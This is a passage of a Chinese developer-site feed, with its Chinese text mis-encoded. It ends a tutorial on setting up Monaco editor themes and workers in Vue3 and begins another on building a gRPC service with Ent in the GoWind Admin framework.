    { <span class="hljs-attr">token</span>: <span class="hljs-string">'type'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// ç±»å‹æ ‡è¯†æ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'class'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// ç±»åæ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'function'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'a9b1d6'</span> }, <span class="hljs-comment">// å‡½æ•°åæ·¡è“</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'variable'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// å˜é‡åæ·¡ç´«</span>
  ],
  <span class="hljs-attr">colors</span>: {
    <span class="hljs-string">'editor.background'</span>: <span class="hljs-string">'#252837'</span>, <span class="hljs-comment">// ç¼–è¾‘å™¨èƒŒæ™¯</span>
    <span class="hljs-string">'editor.foreground'</span>: <span class="hljs-string">'#c5cceb'</span>, <span class="hljs-comment">// é»˜è®¤å‰æ™¯æ–‡å­—</span>
    <span class="hljs-string">'editor.lineHighlightBackground'</span>: <span class="hljs-string">'#29344c'</span>, <span class="hljs-comment">// å½“å‰è¡Œé«˜äº®èƒŒæ™¯</span>
    <span class="hljs-string">'editor.inactiveSelectionBackground'</span>: <span class="hljs-string">'rgba(69, 137, 255, 0.15)'</span>, <span class="hljs-comment">// æœªæ¿€æ´»é€‰åŒºèƒŒæ™¯</span>
    <span class="hljs-string">'editorCursor.foreground'</span>: <span class="hljs-string">'#c5cceb'</span>, <span class="hljs-comment">// å…‰æ ‡é¢œè‰²</span>
    <span class="hljs-string">'editorWhitespace.foreground'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// ç©ºç™½å­—ç¬¦æç¤ºè‰²</span>
    <span class="hljs-string">'editorIndentGuide.background'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// ç¼©è¿›æŒ‡ç¤ºçº¿</span>
    <span class="hljs-string">'editorIndentGuide.activeBackground'</span>: <span class="hljs-string">'#a9b1d6'</span>, <span class="hljs-comment">// æ´»åŠ¨ç¼©è¿›æŒ‡ç¤ºçº¿</span>
    <span class="hljs-string">'editorLineNumber.foreground'</span>: <span class="hljs-string">'#617b91'</span>, <span class="hljs-comment">// è¡Œå·é»˜è®¤é¢œè‰²</span>
    <span class="hljs-string">'editorLineNumber.activeForeground'</span>: <span class="hljs-string">'#c5cceb'</span>, <span class="hljs-comment">// å½“å‰è¡Œå·é¢œè‰²</span>
    <span class="hljs-string">'editorGutter.background'</span>: <span class="hljs-string">'#252837'</span>, <span class="hljs-comment">// è¡Œå·åŒºåŸŸèƒŒæ™¯</span>
    <span class="hljs-string">'editorWidget.background'</span>: <span class="hljs-string">'#29344c'</span>, <span class="hljs-comment">// å¼¹å‡ºç»„ä»¶èƒŒæ™¯</span>
    <span class="hljs-string">'editorWidget.border'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// å¼¹å‡ºç»„ä»¶è¾¹æ¡†</span>
    <span class="hljs-string">'editorSuggestWidget.background'</span>: <span class="hljs-string">'#29344c'</span>, <span class="hljs-comment">// æ™ºèƒ½æç¤ºèƒŒæ™¯</span>
    <span class="hljs-string">'editorSuggestWidget.border'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// æ™ºèƒ½æç¤ºè¾¹æ¡†</span>
  },
};

<span class="hljs-comment">// æ³¨å†Œè‡ªå®šä¹‰ä¸»é¢˜</span>
monaco.<span class="hljs-property">editor</span>.<span class="hljs-title function_">defineTheme</span>(<span class="hljs-string">'custom-dark'</span>, customTheme);
</code></pre>
<p>ç•Œé¢æ•ˆæœï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b35ffce6702c462fab6bb45c0bdaafa5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg562U5qGIYW5zd2Vy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766111544&amp;x-signature=6lYfN9mafa1AlN0u0RmwgWvaIrA%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">monaco.ts å®Œæ•´çš„é…ç½®</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> editorWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/editor/editor.worker?worker'</span>;
<span class="hljs-keyword">import</span> htmlWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/html/html.worker?worker'</span>;
<span class="hljs-keyword">import</span> cssWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/css/css.worker?worker'</span>;
<span class="hljs-keyword">import</span> jsonWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/json/json.worker?worker'</span>;
<span class="hljs-keyword">import</span> tsWorker <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor/esm/vs/language/typescript/ts.worker?worker'</span>;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> monaco <span class="hljs-keyword">from</span> <span class="hljs-string">'monaco-editor'</span>;
declare <span class="hljs-variable language_">global</span> {
  interface <span class="hljs-title class_">Window</span> {
    <span class="hljs-title class_">MonacoEnvironment</span>?: {
      <span class="hljs-attr">getWorker</span>: <span class="hljs-function">(<span class="hljs-params">moduleId: string, label: string</span>) =&gt;</span> <span class="hljs-title class_">Worker</span>;
    };
  }
}
(self <span class="hljs-keyword">as</span> <span class="hljs-title class_">Window</span>).<span class="hljs-property">MonacoEnvironment</span> = {
  <span class="hljs-title function_">getWorker</span>(<span class="hljs-params">_: string, label: string</span>) {
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'json'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">jsonWorker</span>();
    }
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'css'</span> || label === <span class="hljs-string">'scss'</span> || label === <span class="hljs-string">'less'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">cssWorker</span>();
    }
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'html'</span> || label === <span class="hljs-string">'handlebars'</span> || label === <span class="hljs-string">'razor'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">htmlWorker</span>();
    }
    <span class="hljs-keyword">if</span> (label === <span class="hljs-string">'typescript'</span> || label === <span class="hljs-string">'javascript'</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">tsWorker</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">editorWorker</span>();
  },
};
<span class="hljs-comment">// å®šä¹‰ç¬¦åˆé¡¹ç›®ç³»ç»Ÿçš„è‡ªå®šä¹‰ä¸»é¢˜</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">customTheme</span>: monaco.<span class="hljs-property">editor</span>.<span class="hljs-property">IStandaloneThemeData</span> = {
  <span class="hljs-attr">base</span>: <span class="hljs-string">'vs-dark'</span>, <span class="hljs-comment">// åŸºäºå®˜æ–¹æš—è‰²ä¸»é¢˜</span>
  <span class="hljs-attr">inherit</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ç»§æ‰¿é»˜è®¤è¯­æ³•é«˜äº®è§„åˆ™</span>
  <span class="hljs-attr">rules</span>: [
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'comment'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'617b91'</span>, <span class="hljs-attr">fontStyle</span>: <span class="hljs-string">'italic'</span> }, <span class="hljs-comment">// æ³¨é‡Šå‘ˆç°æ–œä½“ç°è“</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'keyword'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span>, <span class="hljs-attr">fontStyle</span>: <span class="hljs-string">'bold'</span> }, <span class="hljs-comment">// å…³é”®å­—åŠ ç²—æ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'string'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'a9b1d6'</span> }, <span class="hljs-comment">// å­—ç¬¦ä¸²æ·¡è“</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'number'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// æ•°å­—æ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'operator'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c7cacf'</span> }, <span class="hljs-comment">// è¿ç®—ç¬¦æµ…ç°</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'delimiter'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c7cacf'</span> }, <span class="hljs-comment">// åˆ†éš”ç¬¦æµ…ç°</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'type'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// ç±»å‹æ ‡è¯†æ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'class'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// ç±»åæ·¡ç´«</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'function'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'a9b1d6'</span> }, <span class="hljs-comment">// å‡½æ•°åæ·¡è“</span>
    { <span class="hljs-attr">token</span>: <span class="hljs-string">'variable'</span>, <span class="hljs-attr">foreground</span>: <span class="hljs-string">'c5cceb'</span> }, <span class="hljs-comment">// å˜é‡åæ·¡ç´«</span>
  ],
  <span class="hljs-attr">colors</span>: {
    <span class="hljs-string">'editor.background'</span>: <span class="hljs-string">'#252837'</span>, <span class="hljs-comment">// ç¼–è¾‘å™¨èƒŒæ™¯</span>
    <span class="hljs-string">'editor.foreground'</span>: <span class="hljs-string">'#c5cceb'</span>, <span class="hljs-comment">// é»˜è®¤å‰æ™¯æ–‡å­—</span>
    <span class="hljs-string">'editor.lineHighlightBackground'</span>: <span class="hljs-string">'#29344c'</span>, <span class="hljs-comment">// å½“å‰è¡Œé«˜äº®èƒŒæ™¯</span>
    <span class="hljs-string">'editor.inactiveSelectionBackground'</span>: <span class="hljs-string">'rgba(69, 137, 255, 0.15)'</span>, <span class="hljs-comment">// æœªæ¿€æ´»é€‰åŒºèƒŒæ™¯</span>
    <span class="hljs-string">'editorCursor.foreground'</span>: <span class="hljs-string">'#c5cceb'</span>, <span class="hljs-comment">// å…‰æ ‡é¢œè‰²</span>
    <span class="hljs-string">'editorWhitespace.foreground'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// ç©ºç™½å­—ç¬¦æç¤ºè‰²</span>
    <span class="hljs-string">'editorIndentGuide.background'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// ç¼©è¿›æŒ‡ç¤ºçº¿</span>
    <span class="hljs-string">'editorIndentGuide.activeBackground'</span>: <span class="hljs-string">'#a9b1d6'</span>, <span class="hljs-comment">// æ´»åŠ¨ç¼©è¿›æŒ‡ç¤ºçº¿</span>
    <span class="hljs-string">'editorLineNumber.foreground'</span>: <span class="hljs-string">'#617b91'</span>, <span class="hljs-comment">// è¡Œå·é»˜è®¤é¢œè‰²</span>
    <span class="hljs-string">'editorLineNumber.activeForeground'</span>: <span class="hljs-string">'#c5cceb'</span>, <span class="hljs-comment">// å½“å‰è¡Œå·é¢œè‰²</span>
    <span class="hljs-string">'editorGutter.background'</span>: <span class="hljs-string">'#252837'</span>, <span class="hljs-comment">// è¡Œå·åŒºåŸŸèƒŒæ™¯</span>
    <span class="hljs-string">'editorWidget.background'</span>: <span class="hljs-string">'#29344c'</span>, <span class="hljs-comment">// å¼¹å‡ºç»„ä»¶èƒŒæ™¯</span>
    <span class="hljs-string">'editorWidget.border'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// å¼¹å‡ºç»„ä»¶è¾¹æ¡†</span>
    <span class="hljs-string">'editorSuggestWidget.background'</span>: <span class="hljs-string">'#29344c'</span>, <span class="hljs-comment">// æ™ºèƒ½æç¤ºèƒŒæ™¯</span>
    <span class="hljs-string">'editorSuggestWidget.border'</span>: <span class="hljs-string">'#535f79'</span>, <span class="hljs-comment">// æ™ºèƒ½æç¤ºè¾¹æ¡†</span>
  },
};
<span class="hljs-comment">// æ³¨å†Œè‡ªå®šä¹‰ä¸»é¢˜</span>
monaco.<span class="hljs-property">editor</span>.<span class="hljs-title function_">defineTheme</span>(<span class="hljs-string">'custom-dark'</span>, customTheme);
</code></pre>
<h2 data-id="heading-5">æ€»ç»“</h2>
<p>ä»¥ä¸Šå°±æ˜¯ä½œè€…ä¸ªäººåœ¨Vue3é¡¹ç›®ä¸­é›†æˆ monaco.editor çš„è¿‡ç¨‹</p>
<p>æ€»ä½“æ¥è¯´ä¹Ÿæ˜¯éå¸¸çš„ç®€å•</p>
<p>å¤§æ¦‚å°±æ˜¯åˆ†ä¸‰æ­¥æµç¨‹å®ç°</p>
<p>1.å®‰è£… <em>monaco-editor</em> å’Œ <em>monaco-editor-vue3</em> æ’ä»¶</p>
<p>2.æ–°å¢å’Œå¼•å…¥ <em>monaco.ts</em> æ–‡ä»¶</p>
<p>3.åœ¨é¡µé¢ä¸­ä½¿ç”¨ <em>CodeEditor</em></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fmonaco-editor" target="_blank" title="https://github.com/microsoft/monaco-editor" ref="nofollow noopener noreferrer">github.com/microsoft/mâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbazingaedward%2Fmonaco-editor-vue3" target="_blank" title="https://github.com/bazingaedward/monaco-editor-vue3" ref="nofollow noopener noreferrer">github.com/bazingaedwaâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šåŸºäº Ent ä»é›¶å®ç°æ–°æœåŠ¡]]></title>    <link>https://juejin.cn/post/7582763878674579483</link>    <guid>https://juejin.cn/post/7582763878674579483</guid>    <pubDate>2025-12-12T09:10:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582763878674579483" data-draft-id="7582777037863338034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šåŸºäº Ent ä»é›¶å®ç°æ–°æœåŠ¡"/> <meta itemprop="keywords" content="åç«¯,Go,ORM"/> <meta itemprop="datePublished" content="2025-12-12T09:10:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å–µä¸ªå’ª"/> <meta itemprop="url" content="https://juejin.cn/user/1350630784901262"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šåŸºäº Ent ä»é›¶å®ç°æ–°æœåŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1350630784901262/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å–µä¸ªå’ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T09:10:11.000Z" title="Fri Dec 12 2025 09:10:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼€ç®±å³ç”¨çš„ GoWind Adminï½œé£è¡Œï¼Œä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ï¼šåŸºäº Ent ä»é›¶å®ç°æ–°æœåŠ¡</h2>
<p>æœ¬æ–‡å°†æŒ‡å¯¼å¼€å‘è€…åœ¨ GoWind Admin ä¼ä¸šçº§å‰åç«¯ä¸€ä½“ä¸­åå°æ¡†æ¶ä¸­ï¼Œä»é›¶å¼€å§‹æ„å»ºä¸€ä¸ªå®Œæ•´çš„ gRPC æœåŠ¡ã€‚æˆ‘ä»¬æ‰€æŒ‡çš„ â€œæœåŠ¡â€ å³ gRPC ä¸­çš„ serviceï¼Œé€šå¸¸åŒ…å«ç‰¹å®šæ•°æ®é›†çš„ CRUDï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰æ“ä½œï¼Œéµå¾ªæ¡†æ¶è§„èŒƒå®ç°é«˜å¯ç»´æŠ¤æ€§ä¸å¯æ‰©å±•æ€§ã€‚</p>
<h3 data-id="heading-1">å‰ç½®å‡†å¤‡</h3>
<p>åœ¨å¼€å§‹å‰ï¼Œè¯·ç¡®ä¿å·²å®Œæˆä»¥ä¸‹ç¯å¢ƒå‡†å¤‡ï¼š</p>
<h4 data-id="heading-2">å¼€å‘ç¯å¢ƒ</h4>
<ul>
<li>Go 1.19+ï¼ˆæ¨è 1.21+ï¼Œæ”¯æŒæœ€æ–°è¯­è¨€ç‰¹æ€§ï¼‰</li>
<li>Gitï¼ˆç‰ˆæœ¬æ§åˆ¶ï¼‰</li>
<li>Protobuf ç¼–è¯‘å™¨ï¼ˆ<code>protoc</code>ï¼Œç”¨äºç¼–è¯‘ proto æ–‡ä»¶ï¼‰</li>
</ul>
<h4 data-id="heading-3">ä¾èµ–å·¥å…·</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…ç›¸å…³çš„å‘½ä»¤è¡Œå·¥å…·</span>
make cli

<span class="hljs-comment"># å®‰è£…ä¾èµ–çš„æ’ä»¶</span>
make plugin
</code></pre>
<h4 data-id="heading-4">é¡¹ç›®ç»“æ„</h4>
<p>å…‹éš† GoWind Admin é¡¹ç›®åï¼Œæ ¸å¿ƒç›®å½•ç»“æ„å¦‚ä¸‹ï¼ˆèšç„¦æœåŠ¡å¼€å‘ç›¸å…³ç›®å½•ï¼‰ï¼š</p>
<pre><code class="hljs language-text" lang="text">go-wind-admin/
â”œâ”€â”€ backend/
â”‚   â”œâ”€â”€ api/gen/go/        # proto ç¼–è¯‘ç”Ÿæˆçš„ Go ä»£ç ï¼ˆè‡ªåŠ¨ç”Ÿæˆï¼Œæ— éœ€æ‰‹åŠ¨ä¿®æ”¹ï¼‰
â”‚   â”œâ”€â”€ api/proto/         # å­˜æ”¾ proto æ¥å£å®šä¹‰æ–‡ä»¶
â”‚   â”œâ”€â”€ app/admin/service/ # ä¸šåŠ¡æœåŠ¡æ ¸å¿ƒå®ç°
â”‚   â”‚   â”œâ”€â”€ internal/
â”‚   â”‚   â”‚   â”œâ”€â”€ data/      # æ•°æ®è®¿é—®å±‚ï¼ˆä¸æ•°æ®åº“äº¤äº’ï¼ŒåŸºäº entï¼‰
â”‚   â”‚   â”‚   â”‚   â””â”€â”€ ent/   # ent ORM è‡ªåŠ¨ç”Ÿæˆçš„æ•°æ®åº“æ“ä½œä»£ç 
â”‚   â”‚   â”‚   â””â”€â”€ service/   # ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆå®ç° gRPC æ¥å£ï¼‰
â”‚   â”‚   â””â”€â”€ server/        # æœåŠ¡æ³¨å†Œï¼ˆå°†æœåŠ¡ç»‘å®šåˆ° gRPC/HTTP æœåŠ¡å™¨ï¼‰
</code></pre>
<h3 data-id="heading-5">ä¸€ã€è®¾è®¡æ•°æ®åº“è¡¨ç»“æ„</h3>
<p>æ•°æ®åº“è¡¨ç»“æ„æ˜¯æœåŠ¡çš„åŸºç¡€ï¼Œéœ€æ ¹æ®ä¸šåŠ¡éœ€æ±‚è®¾è®¡æ ¸å¿ƒå­—æ®µã€‚ä»¥ â€œç”¨æˆ·è¡¨â€ ä¸ºä¾‹ï¼Œéœ€åŒ…å«ï¼š</p>
<ul>
<li>é€šç”¨å­—æ®µï¼šIDï¼ˆä¸»é”®ï¼‰ã€åˆ›å»ºæ—¶é—´ã€æ›´æ–°æ—¶é—´ã€åˆ›å»ºè€… IDã€æ›´æ–°è€… IDï¼ˆç”¨äºå®¡è®¡ï¼‰</li>
<li>ä¸šåŠ¡å­—æ®µï¼šç”¨æˆ·åï¼ˆå”¯ä¸€ï¼‰ã€å¯†ç ã€æ˜µç§°ã€é‚®ç®±ã€æ‰‹æœºå·ç­‰</li>
<li>å…³è”å­—æ®µï¼šè§’è‰² IDã€éƒ¨é—¨ ID ç­‰ï¼ˆç”¨äºå…³è”å…¶ä»–è¡¨ï¼‰</li>
<li>çŠ¶æ€å­—æ®µï¼šç”¨æˆ·çŠ¶æ€ï¼ˆå¯ç”¨ / ç¦ç”¨ï¼‰ã€æ€§åˆ«ç­‰æšä¸¾å­—æ®µ</li>
</ul>
<p><strong>è®¾è®¡åŸåˆ™ï¼š</strong></p>
<ul>
<li>æ ¸å¿ƒå­—æ®µéç©ºï¼ˆå¦‚ç”¨æˆ·åï¼‰ï¼Œéæ ¸å¿ƒå­—æ®µå¯ç©ºï¼ˆå¦‚åœ°å€ï¼‰</li>
<li>é¢‘ç¹æŸ¥è¯¢çš„å­—æ®µæ·»åŠ ç´¢å¼•ï¼ˆå¦‚ç”¨æˆ·åï¼‰</li>
<li>æ•æ„Ÿå­—æ®µï¼ˆå¦‚å¯†ç ï¼‰éœ€åŠ å¯†å­˜å‚¨</li>
</ul>
<h3 data-id="heading-6">äºŒã€ç¼–å†™ ent çš„ schema</h3>
<p>Ent æ˜¯ Go è¯­è¨€çš„ ORM åº“ï¼Œé€šè¿‡ schema å®šä¹‰æ•°æ®åº“å®ä½“ã€‚schema æ–‡ä»¶ä½äº <code>backend/app/admin/service/internal/data/ent/schema</code> ç›®å½•ã€‚</p>
<p>æ­¥éª¤è¯´æ˜ï¼š</p>
<ol>
<li>åˆ›å»º <code>user.go</code> æ–‡ä»¶ï¼Œå®šä¹‰ Us`er ç»“æ„ä½“åŠå…¶é…ç½®ã€‚</li>
<li>é€šè¿‡ <code>Annotations</code> é…ç½®è¡¨åã€å­—ç¬¦é›†ç­‰æ•°æ®åº“å±æ€§ã€‚</li>
<li>é€šè¿‡ <code>Fields</code> å®šä¹‰è¡¨å­—æ®µï¼ŒåŒ…æ‹¬ç±»å‹ã€çº¦æŸï¼ˆå”¯ä¸€ã€éç©ºç­‰ï¼‰ã€æ³¨é‡Šã€‚</li>
<li>é€šè¿‡ <code>Mixin</code> å¤ç”¨é€šç”¨å­—æ®µï¼ˆå¦‚ IDã€æ—¶é—´æˆ³ï¼‰ï¼Œå‡å°‘é‡å¤ä»£ç ã€‚</li>
<li>é€šè¿‡ <code>Indexes</code> å®šä¹‰ç´¢å¼•ï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ã€‚</li>
</ol>
<h4 data-id="heading-7">å…³é”®ä»£ç è§£æï¼š</h4>
